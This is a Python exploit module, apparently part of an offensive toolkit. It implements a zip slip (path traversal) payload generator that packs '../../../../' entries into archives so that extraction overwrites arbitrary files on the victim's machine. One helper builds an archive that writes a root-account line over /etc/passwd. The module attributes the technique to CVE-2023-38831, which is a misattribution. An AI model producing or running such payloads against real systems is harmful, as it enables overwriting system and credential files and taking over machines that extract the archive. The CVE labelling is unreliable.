# core/exploits/archive.py

import os
import zipfile
from pathlib import Path
from dataclasses import dataclass

@dataclass
class ExploitResult:
    success: bool
    message: str = ""
    cve_ids: list = None


class ZipSlipExploit:
    """Exploit module for ZIP slip / path traversal in archives (CVE-2023-38831)."""

    SUPPORTED_OS = {"linux", "windows", "macos"}

    def __init__(self, target_os="linux"):
        self.target_os = target_os.lower()
        self.valid = self.target_os in self.SUPPORTED_OS

    def create_payload(self, output_path, target_file, payload_content):
        """Create a ZIP file with a path traversal payload."""
        try:
            if not self.valid:
                return ExploitResult(False, f"Unsupported OS: {self.target_os}")

            # Normalize the target file path for path traversal
            traversal_path = f"../../../../{target_file.lstrip('/')}"
            with zipfile.ZipFile(output_path, 'w') as zf:
                zf.writestr(traversal_path, payload_content)

            return ExploitResult(True, "Payload created", ["CVE-2023-38831"])
        except Exception as e:
            return ExploitResult(False, f"Error creating payload: {e}")

    @staticmethod
    def create_test_archives(benign_zip_path, malicious_zip_path):
        """Helper to create a benign and a malicious ZIP archive for test comparison."""

        # Benign archive
        with zipfile.ZipFile(benign_zip_path, 'w') as benign:
            benign.writestr("normal.txt", "This is a safe file")

        # Malicious archive (ZIP slip)
        with zipfile.ZipFile(malicious_zip_path, 'w') as malicious:
            malicious.writestr("../../../../etc/passwd", "fake root:x:0:0::/root:/bin/bash")